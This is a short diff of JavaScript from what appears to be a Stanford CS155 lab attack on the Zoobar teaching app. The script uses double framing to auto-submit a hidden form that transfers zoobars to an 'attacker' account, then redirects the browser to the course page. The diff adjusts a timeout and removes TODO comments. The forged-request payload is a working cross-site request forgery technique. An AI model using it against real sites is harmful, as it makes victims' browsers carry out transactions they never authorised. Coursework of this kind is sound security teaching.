@@ -47,7 +47,7 @@
 			var action = "http://" + hostname + "/transfer.php";
 			var zoobars = "10";
 			var attacker_name = "attacker";
-			var timeout = 100;
+			var timeout = 250;
 
 			/* 
 			 * Second (inner) frame for the double framing attack + form that does the transfer and posts to 
@@ -61,10 +61,6 @@
 				"<input type='text' name='recipient' value='" + attacker_name + "'>" +
 				"<input type='text' name='submission' value='Send'>" +
 				"</form>";
-
-			// TODO: test on OSX firefox on zoobar.stanford.edu
-			// TODO: change alamo_attacker to attacker in stanford egg
-			// TODO: change attack to use asynchronous AJAX 
 
 			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
 			
@@ -83,7 +79,7 @@
 			var transferForm = outerFrameDoc.body.children['transferForm'];
 			transferForm.submit();
 			
-			/* Wait 50ms for POST to succeed and redirect to crypto.stanford.edu/cs155 */
+			/* Wait timeout for POST to succeed and redirect to crypto.stanford.edu/cs155 */
 			setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, timeout );
 		//]]>
 		</script>
